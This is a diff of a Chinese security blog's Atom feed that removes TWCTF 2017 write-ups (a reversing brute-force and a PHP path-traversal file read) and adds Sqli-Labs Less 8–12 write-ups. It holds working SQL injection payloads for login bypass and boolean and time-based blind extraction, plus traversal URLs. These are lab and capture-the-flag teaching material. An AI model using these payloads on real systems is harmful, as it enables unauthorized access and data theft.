@@ -169,88 +169,7 @@
       <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
     
     
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
       <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>TWCTF 2017-Rev Rev Rev-writeup</title>
-    <link href="http://yoursite.com/2017/09/02/TWCTF-2017-Rev-Rev-Rev-writeup/"/>
-    <id>http://yoursite.com/2017/09/02/TWCTF-2017-Rev-Rev-Rev-writeup/</id>
-    <published>2017-09-02T04:58:21.000Z</published>
-    <updated>2017-09-02T05:24:11.793Z</updated>
-    
-    <content type="html"><![CDATA[<p>TWCTF 2017-Rev Rev Rev-writeup<br>爆破。warmup题<br><a id="more"></a><br>题目提供了一个64位elf文件。用IDA打开后按f5没反应。gdb打开，进行动态调试。</p>
-<p>程序的基本流程就是，将你的输入读入，然后做个加密处理，比较看是否正确。在0x0804866D处有一个strcmp，我们在这里下个断点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ b *0x0804866D</div><div class="line">Breakpoint 1 at 0x804866d</div></pre></td></tr></table></figure></p>
-<p>然后运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Starting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089f</div><div class="line">Rev! Rev! Rev!</div><div class="line">Your input: aaaa</div><div class="line"></div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0xffffd12b (&quot;yyyy&quot;)</div><div class="line">....</div><div class="line"></div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x804866c:	push   eax</div><div class="line">=&gt; 0x804866d:	call   0x8048410 &lt;strcmp@plt&gt;</div><div class="line">   0x8048672:	add    esp,0x10</div><div class="line"></div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xffffd12b (&quot;yyyy&quot;)</div><div class="line">arg[1]: 0x8048870 --&gt; 0x65d92941</div></pre></td></tr></table></figure></p>
-<p>借助peda插件的帮忙，可以看到我们输入了<code>aaaa</code>后，经过加密变成了<code>yyyy</code>，并且与内存0x8048870处的数据比较。我们把这段内存提取出来看看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/32bx 0x8048870</div><div class="line">0x8048870:	0x41	0x29	0xd9	0x65	0xa1	0xf1	0xe1	0xc9</div><div class="line">0x8048878:	0x19	0x09	0x93	0x13	0xa1	0x09	0xb9	0x49</div><div class="line">0x8048880:	0xb9	0x89	0xdd	0x61	0x31	0x69	0xa1	0xf1</div><div class="line">0x8048888:	0x71	0x21	0x9d	0xd5	0x3d	0x15	0xd5	0x00</div></pre></td></tr></table></figure></p>
-<p>所以我们可以利用输入与断点结合的方式，获取每个可显示字符的加密后的结果，然后根据0x8048870处的数据反推出flag。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ r</div><div class="line">Starting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089f</div><div class="line">Rev! Rev! Rev!</div><div class="line">Your input: abcdefghijklmnopqrstuvwxyz</div><div class="line"></div><div class="line">省略。</div><div class="line"></div><div class="line">gdb-peda$ x/26bx 0xffffd12b</div><div class="line">0xffffd12b:	0xa1	0x61	0xe1	0x11	0x91	0x51	0xd1	0x31</div><div class="line">0xffffd133:	0xb1	0x71	0xf1	0x09	0x89	0x49	0xc9	0x29</div><div class="line">0xffffd13b:	0xa9	0x69	0xe9	0x19	0x99	0x59	0xd9	0x39</div><div class="line">0xffffd143:	0xb9	0x79</div></pre></td></tr></table></figure>
-<p>根据上面的调试结果，可以得出如下的对应关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">0xa1 =&gt; z</div><div class="line">0x61 =&gt; y</div><div class="line">0xe1 =&gt; x</div><div class="line">0x11 =&gt; w</div><div class="line">0x91 =&gt; v</div><div class="line">0x51 =&gt; u</div><div class="line">0xd1 =&gt; t</div><div class="line">0x31 =&gt; s</div><div class="line">0xb1 =&gt; r</div><div class="line">0x71 =&gt; q</div><div class="line">0xf1 =&gt; p</div><div class="line">0x09 =&gt; o</div><div class="line">0x89 =&gt; n</div><div class="line">0x49 =&gt; m</div><div class="line">0xc9 =&gt; l</div><div class="line">0x29 =&gt; k</div><div class="line">0xa9 =&gt; j</div><div class="line">0x69 =&gt; i</div><div class="line">0xe9 =&gt; h</div><div class="line">0x19 =&gt; g</div><div class="line">0x99 =&gt; f</div><div class="line">0x59 =&gt; e</div><div class="line">0xd9 =&gt; d</div><div class="line">0x39 =&gt; c</div><div class="line">0xb9 =&gt; b</div><div class="line">0x79 =&gt; a</div></pre></td></tr></table></figure></p>
-<p>然后接下来根据调试得到大写字母和数字和符号的对应关系。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ r</div><div class="line">Starting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089f</div><div class="line">Rev! Rev! Rev!</div><div class="line">Your input: ABCDEFGHIJKLMNOPQRSTUVWXYZ</div><div class="line"></div><div class="line">省略。</div><div class="line"></div><div class="line">gdb-peda$ x/26bx 0xffffd12b</div><div class="line">0xffffd12b:	0xa5	0x65	0xe5	0x15	0x95	0x55	0xd5	0x35</div><div class="line">0xffffd133:	0xb5	0x75	0xf5	0x0d	0x8d	0x4d	0xcd	0x2d</div><div class="line">0xffffd13b:	0xad	0x6d	0xed	0x1d	0x9d	0x5d	0xdd	0x3d</div><div class="line">0xffffd143:	0xbd	0x7d</div><div class="line"></div><div class="line">gdb-peda$ r</div><div class="line">Starting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089f</div><div class="line">Rev! Rev! Rev!</div><div class="line">Your input: &#123;&#125;0123456789</div><div class="line"></div><div class="line">省略。</div><div class="line"></div><div class="line">gdb-peda$ x/12bx 0xffffd12b</div><div class="line">0xffffd12b:	0x63	0xe3	0x13	0x93	0x53	0xd3	0x33	0xb3</div><div class="line">0xffffd133:	0x73	0xf3	0x41	0x21</div></pre></td></tr></table></figure></p>
-<p>最后根据对应关系得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;qpzisyDnbmboz76oglxpzYdk&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;TWCTF 2017-Rev Rev Rev-writeup&lt;br&gt;爆破。warmup题&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Reverse" scheme="http://yoursite.com/categories/writeup-Reverse/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="re" scheme="http://yoursite.com/tags/re/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>TWCTF 2017-Freshen Uploader-writeup</title>
-    <link href="http://yoursite.com/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/"/>
-    <id>http://yoursite.com/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/</id>
-    <published>2017-09-02T02:33:13.000Z</published>
-    <updated>2017-09-02T02:51:10.113Z</updated>
-    
-    <content type="html"><![CDATA[<p>TWCTF 2017-Freshen Uploader-writeup<br>任意文件读取漏洞。php弱类型比较。<br><a id="more"></a></p>
-<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">In this year, we stopped using Windows so you can&apos;t use DOS tricks!</div><div class="line">http://fup.chal.ctf.westerns.tokyo/</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>该题有两个flag。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/1.png?raw=true" alt=""></p>
-<p>有下载功能，比如点击第一个download后，链接为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=6a92b449761226434f5fce6c8e87295a</div></pre></td></tr></table></figure></p>
-<p>这里存在任意文件读取漏洞。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=../download.php</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/2.png?raw=true" alt=""></p>
-<p>得到download.php的源代码和第一个flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;then_can_y0u_read_file_list?&#125;</div></pre></td></tr></table></figure></p>
-<p>file_list是什么东西？我们读取一下index.php看看：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/3.png?raw=true" alt=""></p>
-<p>根据第一个flag，我们可以猜测第二个flag藏在file_list.php中。但直接读取是不行的，因为download.php的源码用stripos做了检测：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// TWCTF&#123;then_can_y0u_read_file_list?&#125;</span></div><div class="line">$filename = $_GET[<span class="string">'f'</span>];</div><div class="line"><span class="keyword">if</span>(stripos($filename, <span class="string">'file_list'</span>) != <span class="keyword">false</span>) <span class="keyword">die</span>();</div><div class="line">header(<span class="string">"Content-Type: application/octet-stream"</span>);</div><div class="line">header(<span class="string">"Content-Disposition: attachment; filename='$filename'"</span>);</div><div class="line">readfile(<span class="string">"uploads/$filename"</span>);</div></pre></td></tr></table></figure>
-<p>仔细看一下判断语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(stripos($filename, &apos;file_list&apos;) != false) die();</div></pre></td></tr></table></figure></p>
-<p>strpos(str1,str2)返回字符串str2在字符串str1中的位置。如果<code>$filename</code>以<code>file_list</code>开头，则<code>stripos($filename, &#39;file_list&#39;)</code>会返回0，而采用的是<code>!=</code>，也就是说可能存在弱类型比较问题:<code>0 == false</code>。</p>
-<p>绕过了stripos，怎么读取file_list文件？构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=file_list/../../file_list.php</div></pre></td></tr></table></figure></p>
-<p>这样它会把第一个file_list当成文件夹，之后用两个<code>../</code>返回上一层文件夹，并最终读取到file_list.php。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/4.png?raw=true" alt=""></p>
-<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/5.png?raw=true" alt=""></p>
-<p>第二个flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;php_is_very_secure&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;TWCTF 2017-Freshen Uploader-writeup&lt;br&gt;任意文件读取漏洞。php弱类型比较。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
     
       <category term="web" scheme="http://yoursite.com/tags/web/"/>
     
@@ -1050,6 +969,111 @@
     
     </summary>
     
+    
+  </entry>
+  
+  <entry>
+    <title>Sqli-Labs:Less11~12-writeup</title>
+    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less11-12-writeup/"/>
+    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less11-12-writeup/</id>
+    <published>2017-08-23T08:47:48.000Z</published>
+    <updated>2017-08-23T10:05:52.704Z</updated>
+    
+    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
+<p>Less-11 POST-Error Based -Single quotes- String<br>Less-12 POST - Error Based -Double quotes - String<br><a id="more"></a><br>考察post注入，所以要借助工具。比如burp。</p>
+<h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less 11"></a>Less 11</h1><p>当post的数据如下时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
+<p>当post数据如下时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;chybeta&apos;&apos; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
+<p>用如下payload即可登陆成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>这样后台的语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=&apos;admin&apos;#&apos; and password=&apos;chybeta&apos; LIMIT 0,1</div></pre></td></tr></table></figure></p>
+<h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less 12"></a>Less 12</h1><p>和Less 11差不多，将单引号换成双引号。</p>
+<p>post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot;) LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
+<p>发现有括号保护。</p>
+<p>最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;)#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>后台查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=(&quot;admin&quot;)#&quot;) and password=(&quot;chybeta&quot;) LIMIT 0,1</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
+&lt;p&gt;Less-11 POST-Error Based -Single quotes- String&lt;br&gt;Less-12 POST - Error Based -Double quotes - String&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Sqli-Labs:Less8~10-writeup</title>
+    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/"/>
+    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/</id>
+    <published>2017-08-23T07:58:33.000Z</published>
+    <updated>2017-08-23T08:32:00.539Z</updated>
+    
+    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
+<p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>Less-9 GET-Time based - Single Quotes<br>Less-10 GET-Blind-Time based - double quotes<br><a id="more"></a></p>
+<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h1><p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 1=1 %23</div></pre></td></tr></table></figure></p>
+<p>发现有 字符串<code>You are in...........</code></p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 2=1 %23</div></pre></td></tr></table></figure></p>
+<p>发现字符串消失。因此我们可以利用基于页面的变化来进行盲注。<br>比如以下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database(),1,1))&lt;= 255 )%23</div><div class="line"></div><div class="line"></div><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database() from 1 for 1))&lt;= 255 )%23</div></pre></td></tr></table></figure></p>
+<p>即可根据二分法得到数据库名称。</p>
+<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less 9"></a>Less 9</h1><p>该关为GET-Time based - Single Quotes。基于时间的盲注<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(5) %23</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/1.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(10) %23</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/2.png?raw=true" alt=""></p>
+<p>可以看到我们的sleep语句被带到了sql数据库中执行。</p>
+<p>接下去可以利用sql中的if语句来进行注入，当条件正确则返回1，若不正确则sleep。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/3.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/4.png?raw=true" alt=""></p>
+<p>之后利用脚本即可获取数据库名称。</p>
+<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less 10"></a>Less 10</h1><p>Less-10 GET-Blind-Time based - double quotes<br>这个跟Less 9一样，只是由单引号变为了双引号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/5.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/6.png?raw=true" alt=""></p>
+<p>除了sleep，还有benchmark函数来进行时间盲注。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BENCHMARK(count,expr)</div></pre></td></tr></table></figure>
+<p>BENCHMARK()函数重复countTimes次执行表达式expr</p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/7.png?raw=true" alt=""></p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/8.png?raw=true" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
+&lt;p&gt;Less-8 GET-Blind-Boolean Based- Single Quotes&lt;br&gt;Less-9 GET-Time based - Single Quotes&lt;br&gt;Less-10 GET-Blind-Time based - double quotes&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
     
   </entry>
   
